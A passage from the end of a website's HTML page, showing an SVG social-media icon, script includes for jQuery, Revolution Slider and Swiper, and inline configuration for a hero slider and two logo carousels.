                d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334"
              />
            </svg>
          </a>
        </li>
      </ul>
    </div>
    <div id="body_overlay"></div>

    <!-- JS -->
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="js/jquery-migrate-3.4.0.min.js"></script>

    <script src="js/mfn.menu.js"></script>
    <script src="js/jquery.plugins.js"></script>
    <script src="js/jquery.jplayer.min.js"></script>
    <script src="js/animations/animations.js"></script>
    <script src="js/translate3d.js"></script>
    <script src="js/scripts.js"></script>

    <script src="plugins/rs-plugin-6.custom/js/revolution.tools.min.js"></script>
    <script src="plugins/rs-plugin-6.custom/js/rs6.min.js"></script>
    <script src="js/loadComponents.js" defer></script>

    <!-- Swiper JS -->
    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>

    <script>
      var revapi1, tpj;
      jQuery(function () {
        tpj = jQuery;
        if (tpj("#rev_slider_1_1").revolution == undefined) {
          revslider_showDoubleJqueryError("#rev_slider_1_1");
        } else {
          revapi1 = tpj("#rev_slider_1_1")
            .show()
            .revolution({
              sliderType: "hero",
              sliderLayout: "fullwidth",
              visibilityLevels: "1240,1240,778,778",
              gridwidth: "1240,1240,778,778",
              gridheight: "860,860,960,960",
              spinner: "spinner7",
              editorheight: "860,768,960,720",
              responsiveLevels: "1240,1240,778,778",
              disableProgressBar: "on",
              navigation: {
                onHoverStop: false,
              },
              parallax: {
                levels: [
                  5, 10, 15, 20, 25, 30, 35, 40, 45, 46, 47, 48, 49, 50, 51, 30,
                ],
                type: "scroll",
                origo: "slidercenter",
                speed: 0,
              },
              fallbacks: {
                allowHTML5AutoPlayOnAndroid: true,
              },
            });
        }
      });
    </script>

    <script>
      var swiper = new Swiper(".swiper-container", {
        slidesPerView: 6, // or specify a number of slides per view
        spaceBetween: 30, // adjust as needed

        freeMode: true,
        autoplay: {
          delay: 4000,
          disableOnInteraction: false,
        },
        pagination: {
          el: ".swiper-pagination",
          clickable: true,
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev",
        },
        breakpoints: {
          // when window width is <= 992px (iPad and smaller desktop screens)
          992: {
            slidesPerView: 6,
            spaceBetween: 30,
          },
          // when window width is <= 480px (mobile)
          480: {
            slidesPerView: 2,
            spaceBetween: 10,
          },
        },
      });
    </script>
    <script>
      var swiper = new Swiper(".swiper-container-clients", {
        slidesPerView: 6, // or specify a number of slides per view
        spaceBetween: 20, // adjust as needed
        freeMode: true,
        autoplay: {
          delay: 2000,
          disableOnInteraction: false,
        },
        pagination: {
          el: ".swiper-pagination",
          clickable: true,
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev",
        },
        breakpoints: {
          992: {
            slidesPerView: 5,
            spaceBetween: 4,
          },
          480: {
            slidesPerView: 3,
            spaceBetween: 10,
          },
        },
      });
    </script>
  </body>
</html>
